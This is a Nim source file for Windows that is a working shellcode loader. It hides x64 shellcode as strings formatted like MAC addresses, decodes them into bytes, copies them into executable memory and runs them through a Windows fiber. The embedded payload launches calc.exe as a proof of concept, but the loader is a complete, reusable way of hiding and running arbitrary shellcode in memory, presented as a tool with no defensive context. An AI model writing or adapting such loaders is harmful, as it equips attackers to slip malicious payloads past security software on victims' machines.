

import winim/lean
import osproc
import strutils

proc parseHex(hexStr: string): int =
    var result = 0
    for c in hexStr:
        result = result * 16 + (if c in {'0'..'9'}: ord(c) - ord('0')
                                elif c in {'a'..'f'}: ord(c) - ord('a') + 10
                                elif c in {'A'..'F'}: ord(c) - ord('A') + 10
                                else: 0)
    return result

proc macToBytes(mac: string): seq[byte] =
    var bytes: seq[byte]
    let parts = mac.split("-")
    for part in parts:
        let byteValue = parseHex(part)
        bytes.add(byteValue.byte)
    return bytes

proc RunFiber(shellcode: seq[byte]): void =
    let MasterFiber = ConvertThreadToFiber(NULL)
    let vAlloc = VirtualAlloc(NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
    var bytesWritten: SIZE_T
    let pHandle = GetCurrentProcess()
    WriteProcessMemory(pHandle, vAlloc, unsafeaddr shellcode[0], cast[SIZE_T](shellcode.len), addr bytesWritten)
    let xFiber = CreateFiber(0, cast[LPFIBER_START_ROUTINE](vAlloc), NULL)
    SwitchToFiber(xFiber)

when defined(windows):

    const MAC: seq[string] = @[
        "FC-48-83-E4-F0-E8",
        "C0-00-00-00-41-51",
        "41-50-52-51-56-48",
        "31-D2-65-48-8B-52",
        "60-48-8B-52-18-48",
        "8B-52-20-48-8B-72",
        "50-48-0F-B7-4A-4A",
        "4D-31-C9-48-31-C0",
        "AC-3C-61-7C-02-2C",
        "20-41-C1-C9-0D-41",
        "01-C1-E2-ED-52-41",
        "51-48-8B-52-20-8B",
        "42-3C-48-01-D0-8B",
        "80-88-00-00-00-48",
        "85-C0-74-67-48-01",
        "D0-50-8B-48-18-44",
        "8B-40-20-49-01-D0",
        "E3-56-48-FF-C9-41",
        "8B-34-88-48-01-D6",
        "4D-31-C9-48-31-C0",
        "AC-41-C1-C9-0D-41",
        "01-C1-38-E0-75-F1",
        "4C-03-4C-24-08-45",
        "39-D1-75-D8-58-44",
        "8B-40-24-49-01-D0",
        "66-41-8B-0C-48-44",
        "8B-40-1C-49-01-D0",
        "41-8B-04-88-48-01",
        "D0-41-58-41-58-5E",
        "59-5A-41-58-41-59",
        "41-5A-48-83-EC-20",
        "41-52-FF-E0-58-41",
        "59-5A-48-8B-12-E9",
        "57-FF-FF-FF-5D-48",
        "BA-01-00-00-00-00",
        "00-00-00-48-8D-8D",
        "01-01-00-00-41-BA",
        "31-8B-6F-87-FF-D5",
        "BB-F0-B5-A2-56-41",
        "BA-A6-95-BD-9D-FF",
        "D5-48-83-C4-28-3C",
        "06-7C-0A-80-FB-E0",
        "75-05-BB-47-13-72",
        "6F-6A-00-59-41-89",
        "DA-FF-D5-63-61-6C",
        "63-2E-65-78-65-00"
    ]
    
    var shellcode: seq[byte]
    for mac in MAC:
        shellcode.add(macToBytes(mac))

    # This is essentially the equivalent of 'if __name__ == '__main__' in python
    when isMainModule:
        RunFiber(shellcode)
